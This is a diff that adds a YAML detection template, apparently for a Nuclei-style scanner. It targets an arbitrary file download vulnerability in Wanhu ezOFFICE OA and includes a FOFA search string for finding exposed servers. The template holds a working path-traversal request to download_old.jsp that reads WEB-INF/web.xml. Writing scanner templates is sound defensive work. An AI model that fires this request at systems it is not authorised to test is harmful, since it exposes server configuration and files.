@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <web-app
+          - </web-app>
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml'
+id: wanhu-oa-download-fileread-old
+info:
+  author: zan8in
+  description: |
+    万户OA download_old.jsp文件存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件
+    fofa: app="万户网络-ezOFFICE"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 万户OA download_old.jsp 任意文件下载漏洞
+  severity: high
+  tags: wanhu,download,old,fileread,argus-import
